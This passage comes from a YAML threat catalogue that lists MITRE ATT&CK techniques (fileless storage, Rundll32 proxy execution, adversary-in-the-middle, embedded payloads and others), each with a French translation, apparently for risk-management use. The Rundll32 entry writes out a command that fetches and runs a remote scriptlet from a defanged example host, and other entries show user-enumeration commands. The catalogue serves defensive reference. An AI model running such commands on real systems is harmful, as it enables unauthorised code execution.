          \ de m\xE9moire partag\xE9e tels que '/dev/shm', '/run/shm', '/var/run'\
          \ et '/var/lock' peuvent \xE9galement \xEAtre consid\xE9r\xE9s comme du\
          \ stockage sans fichier, car les fichiers \xE9crits dans ces r\xE9pertoires\
          \ sont mapp\xE9s directement \xE0 la RAM et ne sont pas stock\xE9s sur le\
          \ disque. (Citation : Binaire \xE9lastique ex\xE9cut\xE9 \xE0 partir d\u2019\
          un r\xE9pertoire de m\xE9moire partag\xE9e)(Citation : Akami Frog4Shell\
          \ 2024)(Citation : Aquasec Muhstik Malware 2024)\n\n\xC0 l\u2019instar des\
          \ comportements en m\xE9moire sans fichier tels que [Reflective Code Loading](https://attack.mitre.org/techniques/T1620)\
          \ et [Process Injection](https://attack.mitre.org/techniques/T1055), le\
          \ stockage de donn\xE9es sans fichier peut ne pas \xEAtre d\xE9tect\xE9\
          \ par l\u2019antivirus et d\u2019autres outils de s\xE9curit\xE9 des terminaux\
          \ qui ne peuvent acc\xE9der qu\u2019\xE0 des formats de fichiers sp\xE9\
          cifiques \xE0 partir du stockage sur disque. L\u2019exploitation du stockage\
          \ sans fichier peut \xE9galement permettre aux adversaires de contourner\
          \ les protections offertes par les syst\xE8mes de fichiers en lecture seule\
          \ sous Linux. (Citation : Sysdig Fileless Malware 23022)\n\nLes adversaires\
          \ peuvent utiliser le stockage sans fichier pour dissimuler divers types\
          \ de donn\xE9es stock\xE9es, y compris les charges utiles/le shellcode (potentiellement\
          \ utilis\xE9s dans le cadre de [Persistance](https://attack.mitre.org/tactics/TA0003))\
          \ et les donn\xE9es collect\xE9es qui n\u2019ont pas encore \xE9t\xE9 exfiltr\xE9\
          es de la victime (par exemple, [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).\
          \ De plus, il est fr\xE9quent que les adversaires chiffrent, encodent, \xE9\
          pissent ou obscurcissent ces donn\xE9es sans fichier lorsqu\u2019elles sont\
          \ stock\xE9es.\n\nCertaines formes d\u2019activit\xE9 de stockage sans fichier\
          \ peuvent cr\xE9er indirectement des artefacts dans le syst\xE8me de fichiers,\
          \ mais dans des formats centraux et difficiles \xE0 inspecter tels que les\
          \ fichiers physiques WMI (par exemple, '\_%SystemRoot\_%\\System32\\Wbem\\\
          Repository') ou Registre (par exemple, '\_%SystemRoot\_%\\System32\\Config').\
          \ (Citation : Microsoft Fileless)\nhttps://attack.mitre.org/techniques/T1027/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037
    ref_id: T1037
    name: Boot or Logon Initialization Scripts
    description: "Adversaries may use scripts automatically executed at boot or logon\
      \ initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy\
      \ Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can\
      \ be used to perform administrative functions, which may often execute other\
      \ programs or send information to an internal logging server. These scripts\
      \ can vary based on operating system and whether applied locally or remotely.\
      \  \n\nAdversaries may use these scripts to maintain persistence on a single\
      \ system. Depending on the access configuration of the logon scripts, either\
      \ local credentials or an administrator account may be necessary. \n\nAn adversary\
      \ may also be able to escalate their privileges since some boot or logon initialization\
      \ scripts run with higher privileges.\nhttps://attack.mitre.org/techniques/T1037"
    translations:
      fr:
        name: "Scripts d\u2019initialisation de d\xE9marrage ou de connexion"
        description: "Les adversaires peuvent utiliser des scripts ex\xE9cut\xE9s\
          \ automatiquement lors de l\u2019initialisation du d\xE9marrage ou de l\u2019\
          ouverture de session pour \xE9tablir la persistance. (Citation : Mandiant\
          \ APT29 Eye Spy Email 22 novembre)(Citation : Anomali Rocke, mars 2019)\
          \ Les scripts d\u2019initialisation peuvent \xEAtre utilis\xE9s pour ex\xE9\
          cuter des fonctions administratives, qui peuvent souvent ex\xE9cuter d\u2019\
          autres programmes ou envoyer des informations \xE0 un serveur de journalisation\
          \ interne. Ces scripts peuvent varier en fonction du syst\xE8me d\u2019\
          exploitation et s\u2019ils sont appliqu\xE9s localement ou \xE0 distance.\
          \  \n\nLes adversaires peuvent utiliser ces scripts pour maintenir la persistance\
          \ sur un seul syst\xE8me. Selon la configuration d\u2019acc\xE8s des scripts\
          \ d\u2019ouverture de session, des informations d\u2019identification locales\
          \ ou un compte administrateur peuvent \xEAtre n\xE9cessaires. \n\nUn adversaire\
          \ peut \xE9galement \xEAtre en mesure d\u2019\xE9lever ses privil\xE8ges,\
          \ car certains scripts d\u2019initialisation de d\xE9marrage ou d\u2019\
          ouverture de session s\u2019ex\xE9cutent avec des privil\xE8ges plus \xE9\
          lev\xE9s.\nhttps://attack.mitre.org/techniques/T1037"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557
    ref_id: T1557
    name: Adversary-in-the-Middle
    description: 'Adversaries may attempt to position themselves between two or more
      networked devices using an adversary-in-the-middle (AiTM) technique to support
      follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),
      or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).
      By abusing features of common networking protocols that can determine the flow
      of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device
      to communicate through an adversary controlled system so they can collect information
      or perform additional actions.(Citation: Rapid7 MiTM Basics)


      For example, adversaries may manipulate victim DNS settings to enable other
      malicious activities such as preventing/redirecting users from accessing legitimate
      sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation:
      ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their
      position in order to intercept user credentials, including access tokens ([Steal
      Application Access Token](https://attack.mitre.org/techniques/T1528)) and session
      cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation:
      volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s
      can also be used to establish an AiTM position, such as by negotiating a less
      secure, deprecated, or weaker version of communication protocol (SSL/TLS) or
      encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation:
      tlseminar_downgrade_att)


      Adversaries may also leverage the AiTM position to attempt to monitor and/or
      modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).
      Adversaries can setup a position similar to AiTM to prevent traffic from flowing
      to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562)
      and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1557'
    translations:
      fr:
        name: Adversaire au milieu
        description: "Les adversaires peuvent tenter de se positionner entre deux\
          \ ou plusieurs appareils en r\xE9seau \xE0 l\u2019aide d\u2019une technique\
          \ AiTM (Adversary-in-the-Middle) pour soutenir des comportements ult\xE9\
          rieurs tels que [Network Sniffing](https://attack.mitre.org/techniques/T1040),\
          \ [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)\
          \ ou les attaques par rejeu ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).\
          \ En abusant des fonctionnalit\xE9s des protocoles r\xE9seau courants qui\
          \ peuvent d\xE9terminer le flux du trafic r\xE9seau (par exemple, ARP, DNS,\
          \ LLMNR, etc.), les adversaires peuvent forcer un appareil \xE0 communiquer\
          \ par le biais d\u2019un syst\xE8me contr\xF4l\xE9 par l\u2019adversaire\
          \ afin de collecter des informations ou d\u2019effectuer des actions suppl\xE9\
          mentaires. (Citation : Rapid7 MiTM Basics)\n\nPar exemple, les adversaires\
          \ peuvent manipuler les param\xE8tres DNS de la victime pour permettre d\u2019\
          autres activit\xE9s malveillantes, telles que l\u2019emp\xEAchement/la redirection\
          \ des utilisateurs pour qu\u2019ils acc\xE8dent \xE0 des sites l\xE9gitimes\
          \ et/ou la diffusion de logiciels malveillants suppl\xE9mentaires. (R\xE9\
          f\xE9rence : ttint_rat)(R\xE9f\xE9rence : dns_changer_trojans)(R\xE9f\xE9\
          rence : ad_blocker_with_miner) Les adversaires peuvent \xE9galement manipuler\
          \ le DNS et exploiter leur position afin d\u2019intercepter les informations\
          \ d\u2019identification des utilisateurs, y compris les jetons d\u2019acc\xE8\
          s ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528))\
          \ et les cookies de session ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).\
          \ (R\xE9f\xE9rence : volexity_0day_sophos_FW)(Citation : Tactiques symboliques)\
          \ [Attaque de r\xE9trogradation]Les (https://attack.mitre.org/techniques/T1562/010)s\
          \ peuvent \xE9galement \xEAtre utilis\xE9s pour \xE9tablir une position\
          \ AiTM, par exemple en n\xE9gociant une version moins s\xE9curis\xE9e, obsol\xE8\
          te ou plus faible du protocole de communication (SSL/TLS) ou de l\u2019\
          algorithme de chiffrement. (R\xE9f\xE9rence : mitm_tls_downgrade_att)(R\xE9\
          f\xE9rence : taxonomy_downgrade_att_tls)(R\xE9f\xE9rence : tlseminar_downgrade_att)\n\
          \nLes adversaires peuvent \xE9galement tirer parti de la position AiTM pour\
          \ tenter de surveiller et/ou de modifier le trafic, comme dans [Manipulation\
          \ de donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002).\
          \ Les adversaires peuvent configurer une position similaire \xE0 AiTM pour\
          \ emp\xEAcher le trafic de circuler vers la destination appropri\xE9e, potentiellement\
          \ vers [Entraver les d\xE9fenses](https://attack.mitre.org/techniques/T1562)\
          \ et/ou \xE0 l\u2019appui d\u2019un [D\xE9ni de service du r\xE9seau](https://attack.mitre.org/techniques/T1498).\n\
          https://attack.mitre.org/techniques/T1557"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1033
    ref_id: T1033
    name: System Owner/User Discovery
    description: 'Adversaries may attempt to identify the primary user, currently
      logged in user, set of users that commonly uses a system, or whether a user
      is actively using the system. They may do this, for example, by retrieving account
      usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      The information may be collected in a number of different ways using other Discovery
      techniques, because user and username details are prevalent throughout a system
      and include running process ownership, file/directory ownership, session information,
      and system logs. Adversaries may use the information from [System Owner/User
      Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Various utilities and commands may acquire this information, including <code>whoami</code>.
      In macOS and Linux, the currently logged in user can be identified with <code>w</code>
      and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v ''_''</code>
      command can also be used to enumerate user accounts. Environment variables,
      such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to
      access this information.


      On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `show users` and `show ssh` can be used to display users currently
      logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT
      TA18-106A Network Infrastructure Devices 2018)

      https://attack.mitre.org/techniques/T1033'
    translations:
      fr:
        name: "D\xE9couverte du propri\xE9taire du syst\xE8me/de l\u2019utilisateur"
        description: "Les adversaires peuvent tenter d\u2019identifier l\u2019utilisateur\
          \ principal, l\u2019utilisateur actuellement connect\xE9, l\u2019ensemble\
          \ d\u2019utilisateurs qui utilisent couramment un syst\xE8me ou si un utilisateur\
          \ utilise activement le syst\xE8me. Ils peuvent le faire, par exemple, en\
          \ r\xE9cup\xE9rant les noms d\u2019utilisateur des comptes ou en utilisant\
          \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Les\
          \ informations peuvent \xEAtre collect\xE9es de diff\xE9rentes mani\xE8\
          res \xE0 l\u2019aide d\u2019autres techniques de d\xE9couverte, car les\
          \ d\xE9tails de l\u2019utilisateur et du nom d\u2019utilisateur sont r\xE9\
          pandus dans l\u2019ensemble d\u2019un syst\xE8me et incluent la propri\xE9\
          t\xE9 du processus en cours d\u2019ex\xE9cution, la propri\xE9t\xE9 des\
          \ fichiers/r\xE9pertoires, les informations de session et les journaux syst\xE8\
          me. Les adversaires peuvent utiliser les informations de [D\xE9couverte\
          \ du propri\xE9taire du syst\xE8me/de l\u2019utilisateur](https://attack.mitre.org/techniques/T1033)\
          \ lors de la d\xE9couverte automatique pour fa\xE7onner des comportements\
          \ ult\xE9rieurs, notamment si l\u2019adversaire infecte compl\xE8tement\
          \ la cible et/ou tente ou non des actions sp\xE9cifiques.\n\nDivers utilitaires\
          \ et commandes peuvent acqu\xE9rir ces informations, y compris <code>whoami</code>.\
          \ Sous macOS et Linux, l\u2019utilisateur actuellement connect\xE9 peut\
          \ \xEAtre identifi\xE9 par <code>w</code> et <code>who</code>. Sur macOS,\
          \ la commande <code>dscl . list /Users | grep -v '_'</code> peut \xE9galement\
          \ \xEAtre utilis\xE9e pour \xE9num\xE9rer les comptes d\u2019utilisateurs.\
          \ Les variables <code>d\u2019environnement, telles que %USERNAME\_%</code>\
          \ et <code>$USER</code>, peuvent \xE9galement \xEAtre utilis\xE9es pour\
          \ acc\xE9der \xE0 ces informations.\n\nSur les p\xE9riph\xE9riques r\xE9\
          seau, les commandes [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que 'show users' et 'show ssh' peuvent \xEAtre utilis\xE9es pour\
          \ afficher les utilisateurs actuellement connect\xE9s au p\xE9riph\xE9rique.\
          \ (R\xE9f\xE9rence : show_ssh_users_cmd_cisco)(R\xE9f\xE9rence : US-CERT\
          \ TA18-106A Network Infrastructure Devices 2018)\nhttps://attack.mitre.org/techniques/T1033"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583
    ref_id: T1583
    name: Acquire Infrastructure
    description: 'Adversaries may buy, lease, rent, or obtain infrastructure that
      can be used during targeting. A wide variety of infrastructure exists for hosting
      and orchestrating adversary operations. Infrastructure solutions include physical
      or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease)
      Some infrastructure providers offer free trial periods, enabling infrastructure
      acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally,
      botnets are available for rent or purchase.


      Use of these infrastructure solutions allows adversaries to stage, launch, and
      execute operations. Solutions may help adversary operations blend in with traffic
      that is seen as normal, such as contacting third-party web services or acquiring
      infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090),
      including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation:
      FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022)
      Depending on the implementation, adversaries may use infrastructure that makes
      it difficult to physically tie back to them as well as utilize infrastructure
      that can be rapidly provisioned, modified, and shut down.

      https://attack.mitre.org/techniques/T1583'
    translations:
      fr:
        name: "Acqu\xE9rir des infrastructures"
        description: "Les adversaires peuvent acheter, louer, louer ou obtenir une\
          \ infrastructure qui peut \xEAtre utilis\xE9e pendant le ciblage. Il existe\
          \ une grande vari\xE9t\xE9 d\u2019infrastructures pour h\xE9berger et orchestrer\
          \ les op\xE9rations de l\u2019adversaire. Les solutions d\u2019infrastructure\
          \ comprennent des serveurs physiques ou cloud, des domaines et des services\
          \ Web tiers. (Citation : TrendmicroHideoutsLease) Certains fournisseurs\
          \ d\u2019infrastructure offrent des p\xE9riodes d\u2019essai gratuites,\
          \ ce qui permet d\u2019acqu\xE9rir des infrastructures \xE0 un co\xFBt limit\xE9\
          \ ou gratuit. (Citation\_: Essai gratuit PurpleUrchin) De plus, les botnets\
          \ sont disponibles \xE0 la location ou \xE0 l\u2019achat.\n\nL\u2019utilisation\
          \ de ces solutions d\u2019infrastructure permet aux adversaires de mettre\
          \ en sc\xE8ne, de lancer et d\u2019ex\xE9cuter des op\xE9rations. Les solutions\
          \ peuvent aider les op\xE9rations de l\u2019adversaire \xE0 se fondre dans\
          \ le trafic consid\xE9r\xE9 comme normal, par exemple en contactant des\
          \ services Web tiers ou en acqu\xE9rant une infrastructure pour prendre\
          \ en charge [Proxy](https://attack.mitre.org/techniques/T1090), y compris\
          \ \xE0 partir de services proxy r\xE9sidentiels. (R\xE9f\xE9rence : amnesty_nso_pegasus)(Citation\
          \ : Bourrage d\u2019identifiants par procuration par le FBI)(R\xE9f\xE9\
          rence : Mandiant APT29 Microsoft 365 2022) En fonction de la mise en \u0153\
          uvre, les adversaires peuvent utiliser une infrastructure qui rend difficile\
          \ la connexion physique \xE0 eux, ainsi qu\u2019une infrastructure qui peut\
          \ \xEAtre rapidement provisionn\xE9e, modifi\xE9e et arr\xEAt\xE9e.\nhttps://attack.mitre.org/techniques/T1583"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.011
    ref_id: T1218.011
    name: Rundll32
    description: 'Adversaries may abuse rundll32.exe to proxy execution of malicious
      code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)),
      may avoid triggering security tools that may not monitor execution of the rundll32.exe
      process because of allowlists or false positives from normal operations. Rundll32.exe
      is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname,
      DLLfunction}</code>).


      Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002)
      Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code>
      and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes
      rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)
      can be proxied through Rundll32.exe.


      Rundll32 can also be used to execute scripts such as JavaScript. This can be
      done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication
      ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This
      behavior has been seen used by malware such as Poweliks. (Citation: This is
      Security Command Line Confusion)


      Adversaries may also attempt to obscure malicious code from analysis by abusing
      the manner in which rundll32.exe loads DLL function names. As part of Windows
      compatibility support for various character sets, rundll32.exe will first check
      for wide/Unicode then ANSI character-supported functions before loading the
      specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll,
      ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>,
      or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>).
      Adversaries may therefore obscure malicious code by creating multiple identical
      exported function names and appending <code>W</code> and/or <code>A</code> to
      harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github
      NoRunDll) DLL functions can also be exported and executed by an ordinal number
      (ex: <code>rundll32.exe file.dll,#1</code>).


      Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036)
      techniques (such as changing DLL file names, file extensions, or function names)
      to further conceal execution of a malicious payload.(Citation: rundll32.exe
      defense evasion)

      https://attack.mitre.org/techniques/T1218/011'
    translations:
      fr:
        name: Rundll32
        description: "Les adversaires peuvent abuser de l\u2019ex\xE9cution de code\
          \ malveillant rundll32.exe \xE0 proxy . L\u2019utilisation de rundll32.exe,\
          \ au lieu de l\u2019ex\xE9cution directe (c\u2019est-\xE0-dire [Modules\
          \ partag\xE9s](https://attack.mitre.org/techniques/T1129)), peut \xE9viter\
          \ de d\xE9clencher des outils de s\xE9curit\xE9 qui peuvent ne pas surveiller\
          \ l\u2019ex\xE9cution du processus rundll32.exe en raison de listes d\u2019\
          autorisation ou de faux positifs provenant d\u2019op\xE9rations normales.\
          \ Rundll32.exe est g\xE9n\xE9ralement associ\xE9 \xE0 l\u2019ex\xE9cution\
          \ de charges utiles DLL (ex : <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\
          \nRundll32.exe peut \xE9galement \xEAtre utilis\xE9 pour ex\xE9cuter des\
          \ fichiers d\u2019\xE9l\xE9ments (.cpl) [Panneau de configuration](https://attack.mitre.org/techniques/T1218/002)\
          \ via les fonctions shell32.dll non document\xE9es <code>Control_RunDLL</code>\
          \ et <code>Control_RunDLLAsUser</code>. Double-cliquer sur un fichier .cpl\
          \ entra\xEEne \xE9galement l\u2019ex\xE9cution de rundll32.exe. (Citation\
          \ : Trend Micro CPL) Par exemple, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)\
          \ peut \xEAtre envoy\xE9 par proxy via Rundll32.exe.\n\nRundll32 peut \xE9\
          galement \xEAtre utilis\xE9 pour ex\xE9cuter des scripts tels que JavaScript.\
          \ Cela peut \xEAtre fait en utilisant une syntaxe similaire \xE0 celle-ci\
          \ : <code>rundll32.exe javascript\_:\"\\.. \\mshtml,RunHTMLApplication \"\
          \_; document.write()\_; GetObject(\"script\_:https[\_:]//www[.]exemple[.]com/malicious.sct\_\
          \xBB)\_\xBB</code> Ce comportement a \xE9t\xE9 observ\xE9 utilis\xE9 par\
          \ des logiciels malveillants tels que Poweliks. (Citation : Il s\u2019agit\
          \ d\u2019une confusion de ligne de commande de s\xE9curit\xE9)\n\nLes adversaires\
          \ peuvent \xE9galement tenter de masquer le code malveillant de l\u2019\
          analyse en abusant de la mani\xE8re dont rundll32.exe charge les noms de\
          \ fonction DLL. Dans le cadre de la prise en charge de la compatibilit\xE9\
          \ Windows pour divers jeux de caract\xE8res, rundll32.exe v\xE9rifierons\
          \ d\u2019abord les fonctions larges/Unicode puis les fonctions prises en\
          \ charge par les caract\xE8res ANSI avant de charger la fonction sp\xE9\
          cifi\xE9e (par exemple, \xE9tant donn\xE9 la commande <code>rundll32.exe\
          \ ExampleDLL.dll, ExampleFunction,</code> rundll32.exe tenteriez d\u2019\
          abord d\u2019ex\xE9cuter <code>ExampleFunctionW</code>, ou \xE0 d\xE9faut\
          \ de cette <code>ExampleFunctionA</code>, avant de charger <code>ExampleFunction</code>).\
          \ Les adversaires peuvent donc masquer le code malveillant en cr\xE9ant\
          \ plusieurs noms de fonctions export\xE9s identiques et en ajoutant <code>W</code>\
          \ et/ou <code>A</code> \xE0 des noms inoffensifs. (Citation : Attaquer Rundll32.exe\
          \ obscurit\xE9)(Citation : github noRunDll) Les fonctions DLL peuvent \xE9\
          galement \xEAtre export\xE9es et ex\xE9cut\xE9es par un num\xE9ro ordinal\
          \ (ex : <code>rundll32.exe file.dll,#1</code>).\n\nDe plus, les adversaires\
          \ peuvent utiliser des techniques de masquage(https://attack.mitre.org/techniques/T1036)\
          \ (telles que la modification des noms de fichiers DLL, des extensions de\
          \ fichiers ou des noms de fonctions) pour dissimuler davantage l\u2019ex\xE9\
          cution d\u2019une charge utile malveillante. (Citation : rundll32.exe \xE9\
          vasion de la d\xE9fense)\nhttps://attack.mitre.org/techniques/T1218/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1613
    ref_id: T1613
    name: Container and Resource Discovery
    description: "Adversaries may attempt to discover containers and other resources\
      \ that are available within a containers environment. Other resources may include\
      \ images, deployments, pods, nodes, and other information such as the status\
      \ of a cluster.\n\nThese resources can be viewed within web applications such\
      \ as the Kubernetes dashboard or can be queried via the Docker and Kubernetes\
      \ APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may\
      \ leak information about the environment, such as the environment\u2019s configuration,\
      \ which services are available, and what cloud provider the victim may be utilizing.\
      \ The discovery of these resources may inform an adversary\u2019s next steps\
      \ in the environment, such as how to perform lateral movement and which methods\
      \ to utilize for execution.\nhttps://attack.mitre.org/techniques/T1613"
    translations:
      fr:
        name: "D\xE9couverte de conteneurs et de ressources"
        description: "Les adversaires peuvent tenter de d\xE9couvrir des conteneurs\
          \ et d\u2019autres ressources disponibles dans un environnement de conteneurs.\
          \ D\u2019autres ressources peuvent inclure des images, des d\xE9ploiements,\
          \ des pods, des n\u0153uds et d\u2019autres informations telles que l\u2019\
          \xE9tat d\u2019un cluster.\n\nCes ressources peuvent \xEAtre consult\xE9\
          es dans des applications web telles que le tableau de bord Kubernetes ou\
          \ peuvent \xEAtre interrog\xE9es via les API Docker et Kubernetes. (Citation\
          \ : API Docker)(Citation : API Kubernetes) Dans Docker, les journaux peuvent\
          \ divulguer des informations sur l\u2019environnement, telles que la configuration\
          \ de l\u2019environnement, les services disponibles et le fournisseur de\
          \ cloud que la victime peut utiliser. La d\xE9couverte de ces ressources\
          \ peut \xE9clairer les prochaines \xE9tapes d\u2019un adversaire dans l\u2019\
          environnement, telles que la fa\xE7on d\u2019effectuer un mouvement lat\xE9\
          ral et les m\xE9thodes d\u2019ex\xE9cution \xE0 utiliser.\nhttps://attack.mitre.org/techniques/T1613"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.007
    ref_id: T1583.007
    name: Serverless
    description: 'Adversaries may purchase and configure serverless cloud infrastructure,
      such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that
      can be used during targeting. By utilizing serverless infrastructure, adversaries
      can make it more difficult to attribute infrastructure used during operations
      back to them.


      Once acquired, the serverless runtime environment can be leveraged to either
      respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)
      traffic to an adversary-owned command and control server.(Citation: BlackWater
      Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps
      Script Abuse 2021) As traffic generated by these functions will appear to come
      from subdomains of common cloud providers, it may be difficult to distinguish
      from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:
      Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare
      Workers)

      https://attack.mitre.org/techniques/T1583/007'
    translations:
      fr:
        name: Sans serveur
        description: "Les adversaires peuvent acheter et configurer une infrastructure\
          \ cloud sans serveur, telle que Cloudflare Workers, des fonctions AWS Lambda\
          \ ou des scripts Google Apps, qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ En utilisant une infrastructure sans serveur, les adversaires peuvent\
          \ rendre plus difficile l\u2019attribution de l\u2019infrastructure utilis\xE9\
          e pendant les op\xE9rations.\n\nUne fois acquis, l\u2019environnement d\u2019\
          ex\xE9cution sans serveur peut \xEAtre exploit\xE9 pour r\xE9pondre directement\
          \ aux machines infect\xE9es ou au trafic [Proxy](https://attack.mitre.org/techniques/T1090)\
          \ vers un serveur de commande et de contr\xF4le appartenant \xE0 l\u2019\
          adversaire. (Citation : BlackWater Malware Cloudflare Workers)(R\xE9f\xE9\
          rence : redirecteur AWS Lambda)(Citation : GWS Apps Script Abuse 2021) \xC9\
          tant donn\xE9 que le trafic g\xE9n\xE9r\xE9 par ces fonctions semblera provenir\
          \ de sous-domaines de fournisseurs de cloud courants, il peut \xEAtre difficile\
          \ de distinguer le trafic ordinaire destin\xE9 \xE0 ces fournisseurs, ce\
          \ qui facilite l\u2019utilisation de [Masquer l\u2019infrastructure](https://attack.mitre.org/techniques/T1665).\
          \ (Citation : D\xE9tection de la commande et du contr\xF4le dans le cloud)(Citation\
          \ : BlackWater Malware Cloudflare Workers)\nhttps://attack.mitre.org/techniques/T1583/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132.001
    ref_id: T1132.001
    name: Standard Encoding
    description: 'Adversaries may encode data with a standard data encoding system
      to make the content of command and control traffic more difficult to detect.
      Command and control (C2) information can be encoded using a standard data encoding
      system that adheres to existing protocol specifications. Common data encoding
      schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia
      Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding
      systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132/001'
    translations:
      fr:
        name: Encodage standard
        description: "Les adversaires peuvent coder les donn\xE9es \xE0 l\u2019aide\
          \ d\u2019un syst\xE8me de codage de donn\xE9es standard pour rendre le contenu\
          \ du trafic de commande et de contr\xF4le plus difficile \xE0 d\xE9tecter.\
          \ Les informations de commande et de contr\xF4le (C2) peuvent \xEAtre cod\xE9\
          es \xE0 l\u2019aide d\u2019un syst\xE8me de codage de donn\xE9es standard\
          \ qui adh\xE8re aux sp\xE9cifications de protocole existantes. Les sch\xE9\
          mas de codage de donn\xE9es courants incluent ASCII, Unicode, hexad\xE9\
          cimal, Base64 et MIME. (Citation : Wikip\xE9dia Binary-to-text Encoding)(citation\
          \ : Codage des caract\xE8res de Wikip\xE9dia) Certains syst\xE8mes d\u2019\
          encodage de donn\xE9es peuvent \xE9galement entra\xEEner une compression\
          \ de donn\xE9es, tels que gzip.\nhttps://attack.mitre.org/techniques/T1132/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.009
    ref_id: T1027.009
    name: Embedded Payloads
    description: "Adversaries may embed payloads within other files to conceal malicious\
      \ content from defenses. Otherwise seemingly benign files (such as scripts and\
      \ executables) may be abused to carry and obfuscate malicious payloads and content.\
      \ In some cases, embedded payloads may also enable adversaries to [Subvert Trust\
      \ Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution\
      \ controls such as digital signatures and notarization tickets.(Citation: Sentinel\
      \ Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation:\
      \ Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003),\
      \ though does not involve weaving malicious content into specific bytes and\
      \ patterns related to legitimate digital media formats.(Citation: GitHub PSImage)\
      \ \n\nFor example, adversaries have been observed embedding payloads within\
      \ or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2)\
      \ Adversaries have also been observed nesting payloads (such as executables\
      \ and run-only scripts) inside a file of the same format.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021) \n\nEmbedded content may also be used\
      \ as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads\
      \ used to infect benign system processes.(Citation: Trend Micro) These embedded\
      \ then injected payloads may be used as part of the modules of malware designed\
      \ to provide specific features such as encrypting C2 communications in support\
      \ of an orchestrator module. For example, an embedded module may be injected\
      \ into default browsers, allowing adversaries to then communicate via the network.(Citation:\
      \ Malware Analysis Report ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
    translations:
      fr:
        name: "Charges utiles int\xE9gr\xE9es"
        description: "Les adversaires peuvent int\xE9grer des charges utiles dans\
          \ d\u2019autres fichiers pour dissimuler le contenu malveillant aux d\xE9\
          fenses. Sinon, des fichiers apparemment inoffensifs (tels que des scripts\
          \ et des ex\xE9cutables) peuvent \xEAtre utilis\xE9s \xE0 mauvais escient\
